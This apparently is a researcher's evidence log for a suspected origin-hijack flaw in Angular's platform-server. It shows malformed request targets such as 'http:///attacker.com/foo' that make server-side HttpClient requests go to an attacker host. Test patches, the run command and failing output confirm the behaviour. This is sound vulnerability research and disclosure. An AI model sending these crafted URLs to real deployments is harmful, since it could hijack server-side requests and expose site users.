# Initial Origin Hijack Evidence

Date: 2026-04-28

## Node request-target reachability

Local Node HTTP parser probe sent raw request lines to a Node server.

Relevant accepted output:

```json
{"raw":"//attacker.test/p","headersHost":"victim.test"}
{"raw":"/\\attacker.test/p","headersHost":"victim.test"}
{"raw":"http:///attacker.test/p","headersHost":"victim.test"}
```

Interpretation: at least direct Node HTTP accepts `http:///attacker.test/p` as a request target and
exposes it to applications as `req.url`.

## Angular URL normalization behavior

Equivalent `parseUrl()` behavior:

```json
{
  "s": "http:///attacker.test/p",
  "can": true,
  "href": "http://attacker.test/p",
  "origin": "http://attacker.test",
  "pathname": "/p",
  "host": "attacker.test",
  "protocol": "http:"
}
```

## Real Angular platform-server test

Temporary test patch:

```ts
const urls = [
  '/\\attacker.com/deep/path',
  '//attacker.com/deep/path',
  'http:///attacker.com/deep/path',
];
```

Command:

```text
pnpm --dir /home/carlosgomez/angular exec bazelisk test //packages/platform-server/test:test --test_filter=PlatformLocation
```

Relevant failure:

```text
Failures:
1) PlatformLocation neutralizes hostname hijack attempts
  Message:
    hostname for URL: "http:///attacker.com/deep/path": Expected 'attacker.com' to be ''.
  Message:
    pathname for URL: "http:///attacker.com/deep/path": Expected '/deep/path' to be 'http:///attacker.com/deep/path'.
```

Interpretation: Angular's existing anti-hijack invariant does not cover this malformed absolute-form
URL. In the real `ServerPlatformLocation`, attacker-controlled host becomes the platform hostname.

## Real Angular server HttpClient rewrite test

Temporary test patch in `packages/platform-server/test/integration_spec.ts` changed the existing
`INITIAL_CONFIG.url` for the server-side `HttpClient` relative URL test:

```diff
- url: 'http://localhost:4000/foo',
+ url: 'http:///attacker.com/foo',
```

The existing test still expected the safe app origin:

```ts
mock.expectOne('http://localhost:4000/testing').flush('success!');
```

Observed failure:

```text
Failures:
1) platform-server integration HttpClient given 'url' is provided in 'INITIAL_CONFIG'
   should resolve relative request URLs to absolute
  Message:
    Error: Expected one matching request for criteria
    "Match URL: http://localhost:4000/testing", found none.
    Requests received are: GET http://attacker.com/testing.
```

Interpretation: the framework chain is confirmed through Angular's own server `HttpClient` path.
When `INITIAL_CONFIG.url` is `http:///attacker.com/foo`, a relative server-side request to
`/testing` is rewritten to `http://attacker.com/testing`.

The temporary Angular test patches were reverted after collecting evidence; the Angular checkout is
clean.

## Default SSR caveat

This evidence confirms the `@angular/platform-server` primitive. It does not yet prove that a
CLI-generated/default `@angular/ssr` Node server passes the malformed value into `INITIAL_CONFIG.url`
unchanged.

The installed `@angular/ssr` Node engine contains a separate request URL constructor:

```js
return new URL(`${protocol}://${hostnameWithPort}${originalUrl ?? url}`);
```

That path may neutralize, alter, or reject the malformed request target before `platform-server`
sees it. The next validation must therefore use the default `@angular/ssr` request handling path,
not only direct `platformServer()` tests.
